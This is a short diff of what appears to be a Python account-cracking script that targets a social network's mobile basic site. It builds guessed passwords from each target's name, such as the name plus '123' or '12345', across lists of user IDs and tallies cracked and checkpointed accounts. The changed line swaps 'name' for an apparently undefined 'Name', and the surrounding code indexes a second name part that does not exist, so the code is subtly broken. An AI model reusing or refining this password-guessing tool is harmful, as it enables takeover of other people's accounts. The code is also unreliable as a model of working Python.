@@ -169,7 +169,7 @@ class __crack__:
 		except:
 			print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
 			input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');main()
-		self.__pler__()
+		self.__pler__() 
 	def __mbasic__(self, user, _sempak_):
 		global ok,cp,loop
 		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mPARI\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
@@ -230,7 +230,7 @@ class __crack__:
 						uid, name = yntkts.split('|')
 						xz = name.split(' ')
 						if len(xz) == 1:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
+							pwx = [Name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
 						elif len(xz) == 2:
 							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
 						elif len(xz) == 3:
